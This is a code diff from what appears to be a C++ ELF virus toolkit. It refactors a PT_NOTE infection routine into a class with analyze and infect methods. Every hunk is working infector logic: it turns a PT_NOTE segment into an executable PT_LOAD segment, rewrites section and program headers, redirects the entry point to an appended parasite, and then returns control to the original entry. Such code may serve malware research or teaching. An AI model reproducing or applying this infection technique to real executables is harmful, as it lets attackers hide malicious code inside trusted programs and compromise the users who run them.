@@ -10,28 +10,22 @@
 namespace vt::infector {
 
 namespace {
-struct ElfInfo {
-  Elf64_Addr original_e_entry;
-  Elf64_Addr original_pt_note_file_offset;
-  Elf64_Addr parasite_load_address;
-  Elf64_Xword pt_load_alignment;
-  size_t pt_note_to_be_infected_idx = 0;
-};
 
 uint64_t round_up_to(uint64_t v, uint64_t alignment) {
   return (v & ~(alignment - 1)) + alignment;
 }
 
 bool patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr, uint64_t virus_size,
-               uint64_t virus_offset, const ElfInfo& info) {
+               uint64_t virus_offset, Elf64_Off original_pt_note_file_offset,
+               Elf64_Addr parasite_load_address) {
   auto sht_entry_count = ehdr.e_shnum;
   auto* section_entry = &shdr;
 
   for (size_t i = 0; i < sht_entry_count; ++i) {
-    if (section_entry->sh_offset == info.original_pt_note_file_offset) {
+    if (section_entry->sh_offset == original_pt_note_file_offset) {
       section_entry->sh_offset = virus_offset;
       section_entry->sh_size = virus_size;
-      section_entry->sh_addr = info.parasite_load_address;
+      section_entry->sh_addr = parasite_load_address;
       section_entry->sh_type = SHT_PROGBITS;
       section_entry->sh_flags = SHF_EXECINSTR | SHF_ALLOC;
       section_entry->sh_addralign = 64;
@@ -45,12 +39,14 @@ bool patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr, uint64_t virus_size,
 }
 
 void patch_phdr(Elf64_Phdr& phdr, uint64_t virus_size, uint64_t virus_offset,
-                const ElfInfo& info) {
-  auto* pt_note_to_be_infected = &phdr + info.pt_note_to_be_infected_idx;
+                size_t pt_note_to_be_infected_idx,
+                Elf64_Xword pt_load_alignment,
+                Elf64_Addr parasite_load_address) {
+  auto* pt_note_to_be_infected = &phdr + pt_note_to_be_infected_idx;
   // trasforming pt_note to pt_load
-  pt_note_to_be_infected->p_align = info.pt_load_alignment;
-  pt_note_to_be_infected->p_vaddr = info.parasite_load_address;
-  pt_note_to_be_infected->p_paddr = info.parasite_load_address;
+  pt_note_to_be_infected->p_align = pt_load_alignment;
+  pt_note_to_be_infected->p_vaddr = parasite_load_address;
+  pt_note_to_be_infected->p_paddr = parasite_load_address;
   pt_note_to_be_infected->p_filesz = virus_size;
   pt_note_to_be_infected->p_memsz = virus_size;
   pt_note_to_be_infected->p_offset = virus_offset;
@@ -58,9 +54,10 @@ void patch_phdr(Elf64_Phdr& phdr, uint64_t virus_size, uint64_t virus_offset,
   pt_note_to_be_infected->p_flags = PF_R + PF_X;
 }
 
-void patch_ehdr(Elf64_Ehdr& ehdr, const ElfInfo& info, uint64_t virus_offset) {
+void patch_ehdr(Elf64_Ehdr& ehdr, Elf64_Addr parasite_load_address,
+                uint64_t virus_offset) {
   if (ehdr.e_type == ET_EXEC) {
-    ehdr.e_entry = info.parasite_load_address;
+    ehdr.e_entry = parasite_load_address;
   } else if (ehdr.e_type == ET_DYN) {
     ehdr.e_entry = virus_offset;
   } else {
@@ -68,9 +65,22 @@ void patch_ehdr(Elf64_Ehdr& ehdr, const ElfInfo& info, uint64_t virus_offset) {
   }
 }
 
-bool get_info(const Elf64_Ehdr& ehdr, const Elf64_Phdr& phdr,
-              const Elf64_Shdr& shdr, ElfInfo& info) {
-  info.original_e_entry = ehdr.e_entry;
+}  // namespace
+
+bool PtNoteInfect::analyze(const common::Mmap<PROT_READ>& host_mapping,
+                           const common::Mmap<PROT_READ>& parasite_mapping) {
+  host_size_ = host_mapping.size();
+  parasite_size_ = parasite_mapping.size();
+  const auto& ehdr = *reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
+  if ((ehdr.e_type != ET_EXEC && ehdr.e_type != ET_DYN) ||
+      ehdr.e_ident[EI_CLASS] != ELFCLASS64) {
+    return false;
+  }
+
+  const auto& phdr =
+      *reinterpret_cast<const Elf64_Phdr*>(host_mapping.base() + ehdr.e_phoff);
+
+  original_e_entry_ = ehdr.e_entry;
 
   // Find code segment
   const Elf64_Phdr* phdr_entry = &phdr;
@@ -80,44 +90,28 @@ bool get_info(const Elf64_Ehdr& ehdr, const Elf64_Phdr& phdr,
       // segments.
       auto last_byte_of_segment = phdr_entry->p_vaddr + phdr_entry->p_memsz - 1;
       auto potential_virus_loading_addr = last_byte_of_segment + 1;
-      info.parasite_load_address = std::max(
-          info.parasite_load_address,
+      parasite_load_address_ = std::max(
+          parasite_load_address_,
           round_up_to(potential_virus_loading_addr, phdr_entry->p_align));
       // copy alignment so later we can assign to PT_NOTE.
-      info.pt_load_alignment = phdr_entry->p_align;
+      pt_load_alignment_ = phdr_entry->p_align;
     } else if (phdr_entry->p_type == PT_NOTE) {
       // We found the last PT_NOTE section that can be infected, because
       // GNU_PROPERTY (for example on x86-64) might overlap with the first. On
       // aarch64, it doesn't have such problem.
-      info.pt_note_to_be_infected_idx = i;
-      info.original_pt_note_file_offset = phdr_entry->p_offset;
+      pt_note_to_be_infected_idx_ = i;
+      original_pt_note_file_offset_ = phdr_entry->p_offset;
     }
     // Do not early break out because we must scan all LOAD segments to find the
     // highest vaddress.
   }
 
   return true;
-}  // namespace
+}
 
-}  // namespace
-
-bool pt_note_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
-                      vt::common::Mmap<PROT_READ> parasite_mapping) {
+bool PtNoteInfect::infect(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
+                          vt::common::Mmap<PROT_READ> parasite_mapping) {
   const auto& ehdr = *reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
-  if ((ehdr.e_type != ET_EXEC && ehdr.e_type != ET_DYN) ||
-      ehdr.e_ident[EI_CLASS] != ELFCLASS64) {
-    return false;
-  }
-
-  ElfInfo info{};
-  const auto& phdr =
-      *reinterpret_cast<const Elf64_Phdr*>(host_mapping.base() + ehdr.e_phoff);
-  const auto& shdr =
-      *reinterpret_cast<const Elf64_Shdr*>(host_mapping.base() + ehdr.e_shoff);
-  if (!get_info(ehdr, phdr, shdr, info)) {
-    vt::printf("Cannot correctly parse host elf phdr\n");
-    return false;
-  }
 
   const auto virus_size = parasite_mapping.size();
   // because host size is extended with original_size + virus_size + 3
@@ -128,7 +122,9 @@ bool pt_note_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
   {
     auto& mutable_phdr = *reinterpret_cast<Elf64_Phdr*>(
         host_mapping.mutable_base() + ehdr.e_phoff);
-    patch_phdr(mutable_phdr, virus_size, virus_offset, info);
+    patch_phdr(mutable_phdr, virus_size, virus_offset,
+               pt_note_to_be_infected_idx_, pt_load_alignment_,
+               parasite_load_address_);
   }
 
   {
@@ -136,7 +132,8 @@ bool pt_note_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
     // stripped.
     auto& mutable_shdr = *reinterpret_cast<Elf64_Shdr*>(
         host_mapping.mutable_base() + ehdr.e_shoff);
-    if (!patch_sht(ehdr, mutable_shdr, virus_size, virus_offset, info)) {
+    if (!patch_sht(ehdr, mutable_shdr, virus_size, virus_offset,
+                   original_pt_note_file_offset_, parasite_load_address_)) {
       vt::printf("Failed to patch section header table\n");
       return false;
     }
@@ -145,11 +142,11 @@ bool pt_note_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
   {
     auto& mutable_ehdr =
         *reinterpret_cast<Elf64_Ehdr*>(host_mapping.mutable_base());
-    patch_ehdr(mutable_ehdr, info, virus_offset);
+    patch_ehdr(mutable_ehdr, parasite_load_address_, virus_offset);
   }
 
   vt::printf("inject parasite at %x loading at %x\n", virus_offset,
-             info.parasite_load_address);
+             parasite_load_address_);
   vt::printf("entry changed to %x\n", ehdr.e_entry);
 
   // Inject the virus.
@@ -157,14 +154,14 @@ bool pt_note_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
              parasite_mapping.base(), parasite_mapping.size());
 
   return patch_parasite_and_relinquish_control(
-      ehdr.e_type, info.original_e_entry, info.parasite_load_address,
-      virus_offset, parasite_mapping.size(), host_mapping);
+      ehdr.e_type, original_e_entry_, parasite_load_address_, virus_offset,
+      parasite_mapping.size(), host_mapping);
 }
 
-size_t PtNoteInfect::output_size(size_t host_size, size_t parasite_size) {
+size_t PtNoteInfect::injected_host_size() {
   // The executable offset must be page aligned. Therefore always return 4095
   // extra bytes.
-  return host_size + parasite_size + 4095;
+  return host_size_ + parasite_size_ + 4095;
 }
 
 }  // namespace vt::infector
